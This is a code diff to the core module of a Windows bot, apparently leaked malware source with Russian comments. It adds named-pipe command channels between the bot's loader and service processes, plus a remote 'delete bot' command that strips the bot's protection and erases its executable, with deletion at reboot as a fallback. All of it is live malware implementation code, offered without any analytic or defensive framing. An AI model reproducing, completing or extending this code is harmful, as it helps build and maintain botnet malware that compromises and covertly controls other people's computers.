@@ -7,13 +7,41 @@
 #include "BotDef.h"
 #include "BotHosts.h"
 #include "StrConsts.h"
+#include "Pipes.h"
 //#include "DbgRpt.h"
+
+
+//---------------------------------------------------------------------------
+#include "BotDebug.h"
+
+namespace COREDEBUGSTRINGS
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define COREDBG COREDEBUGSTRINGS::DBGOutMessage<>
+
+//---------------------------------------------------------------------------
+
+
+
+
+
+
+
+class TBotData : public TBotObject
+{
+public:
+	TProcessType ProcessType;  // Тип запущенного процесса
+};
 
 
 
 //---------------------------------------------------------------------------
 
 TBotApplication* Bot = NULL;
+TBotData* BotData = NULL;
 
 //---------------------------------------------------------------------------
 #define MAX_BOT_WORK_FOLDER_LEN 15
@@ -207,7 +235,7 @@ string TBotApplication::PrefixFileName()
 {
 	// Функция возвращает имя файла для хранения префикса
 	if (FPerfixFileName.IsEmpty())
-		FPerfixFileName = MakeFileName(NULL, GetStr(StrPrefixFileName).t_str());
+		FPerfixFileName = MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());
 
 	return FPerfixFileName;
 }
@@ -358,15 +386,126 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 //----------------------------------------------------------------------------
 
 
-void BOT::Initialize()
+
+
+//**************************************************************************
+//  Ынутренние методы ядра бота
+//**************************************************************************
+namespace BOT
+{
+
+
+
+	//--------------------------------------------------
+	//  ExecuteDeleteBot - функция выполняет команду на
+	//				       удаление бота
+	//--------------------------------------------------
+	void WINAPI ExecuteDeleteBot(LPVOID, PPipeMessage, bool &Cancel)
+	{
+		COREDBG("CORE", "Получена команда на удаление бота");
+
+		PCHAR FileName = NULL;
+
+		switch (BotData->ProcessType)
+		{
+
+			case ProcessLoader:
+			{
+				// Выполняем удаление из процесса лоадера
+				FileName = BOT::GetBotFullExeName();
+
+				// Снимаем защиту с бота
+                Unprotect();
+
+                break;
+            }
+		}
+
+		COREDBG("CORE", "Удаляем файл %s", FileName);
+		// Удаляем файл
+		pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL );
+		BOOL Deleted = (BOOL)pDeleteFileA(FileName);
+		if (!Deleted)
+		{
+			// Не удалось на прямую удалить файл.
+			// Удаляем файл после перезагрузки
+			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+        }
+
+        COREDBG("CORE", "Результат удаления бота: Удалён=%d", Deleted);
+
+		STR::Free(FileName);
+
+		Cancel = true;
+    }
+    //----------------------------------------------------------------------
+
+
+
+	//--------------------------------------------------
+	//  GetProcessPipeName - Функция возвращает имя
+	//  служебного пайпа процесса
+	//--------------------------------------------------
+	string GetProcessPipeName(TProcessType Process)
+	{
+		string Name;
+
+		switch (Process) {
+			case ProcessLoader: Name = GetStr(EStrPipeLoader); break;
+		}
+
+        return Name;
+	}
+	//----------------------------------------------------------------------
+
+	//--------------------------------------------------
+	//  CreateProcessPipe - Функция создаёт служебный
+	//                      канал процесса
+	//--------------------------------------------------
+	void CreateProcessPipe(TProcessType Process)
+	{
+		string Name = GetProcessPipeName(Process);
+		if (Name.IsEmpty()) return;
+
+		PProcessPipe P = PIPE::CreateProcessPipe(Name, false);
+		if (P)
+		{
+			// Канал процесса успешно создан, добавляем обработчики команды
+			if (Process == ProcessLoader || Process == ProcessService)
+			{
+				// Регистрируем команду удаления бота
+                PIPE::RegisterMessageHandler(P, ExecuteDeleteBot, NULL, NULL, GetStr(EStrProcessCommandDeleteBot).Hash());
+            }
+		}
+
+		PIPE::StartProcessPipe(P);
+	}
+
+}
+//**************************************************************************
+
+
+
+
+
+
+
+
+
+void BOT::Initialize(TProcessType ProcessType)
 {
 	// Функция инициализирует глобальные настройки бота
 
 	// Инициализируем апи
 	InitializeAPI();
 
-	//Создаём глобальный объект бота
-    Bot = new TBotApplication();
+	//Создаём глобальные объекты бота
+	BotData = new TBotData();
+    Bot     = new TBotApplication();
+
+
+	// Инициализиуем глобальные данные бота
+	BotData->ProcessType = ProcessType;
 
 	// Создаём имя рабочей папки
 	GetWorkFolderHash();
@@ -377,6 +516,9 @@ void BOT::Initialize()
 	// Пытаемся встать в начало списка, что дает нам возможность перехватить
 	// ошибку до возможно установленных системных VEH.
 	//InitialializeGlogalExceptionLogger(TRUE);
+
+
+	CreateProcessPipe(ProcessType);
 }
 
 //----------------------------------------------------------------------------
@@ -572,3 +714,34 @@ bool BOT::IsRunning()
 	return Result;
 }
 
+
+//----------------------------------------------------
+//  SendProcessMessage - Функция отправляет сообщение
+//  служебному процессу
+//----------------------------------------------------
+bool BOT::SendProcessMessage(TProcessType Process, const string &Message)
+{
+	return PIPE::SendMessage(GetProcessPipeName(Process), Message);
+}
+
+
+//----------------------------------------------------
+//  Delete - Функция удаляет ехе бота
+//----------------------------------------------------
+void BOT::Delete()
+{
+	if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
+	{
+		bool C; // Для согласования вызова
+		ExecuteDeleteBot(NULL, NULL, C);
+	}
+	else
+	{
+		//  Метод вызывается из другого процесса,
+		//  Отправляем команду на удаление
+		string Cmd = GetStr(EStrProcessCommandDeleteBot);
+
+		SendProcessMessage(ProcessLoader,  Cmd);
+		SendProcessMessage(ProcessService, Cmd);
+    }
+}
